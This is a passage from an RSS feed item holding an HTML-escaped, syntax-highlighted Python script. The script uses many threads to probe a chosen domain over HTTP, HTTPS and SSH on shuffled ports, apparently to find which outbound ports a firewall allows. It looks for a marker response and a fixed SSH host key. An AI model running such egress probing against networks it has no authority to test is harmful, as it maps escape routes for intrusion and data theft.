&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printClosed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;threadcount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(ports)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Verbosity - set to False above if you don&amp;#39;t want output&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vprint&lt;/span&gt;(status):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; verbose &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(status)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Print open ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print_open&lt;/span&gt;(status):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; printOpen &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; status)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Print closed ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print_closed&lt;/span&gt;(status):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; printClosed &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; status)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_web&lt;/span&gt;(base, domain, port):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  vprint(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Testing: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port), timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w00tw00t&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      print_open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Success! &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exceptions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ConnectionError:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_closed(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed! &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_ssh&lt;/span&gt;(domain, port):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  client &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SSHClient()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  vprint(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Trying SSH to &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; Port: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(domain, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; paramiko&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ssh_exception&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SSHException:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;timeout:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_closed(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed! SSH to &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; Port: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_transport()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_remote_server_key()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_base64() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAAC3NzaC1lZDI1NTE5AAAAIIrfkWLMzwGKRliVsJOjm5OJRJo6AZt7NsqAH8bk9tYc&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Success! SSH to &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; Port: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; concurrent&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;futures&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ThreadPoolExecutor(threadcount) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; executor:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; port &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ports:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test HTTP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_web, base, domain, port)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test HTTPS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_web, base, domain, port)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test SSH&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_ssh, domain, port)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
  </channel>
</rss>
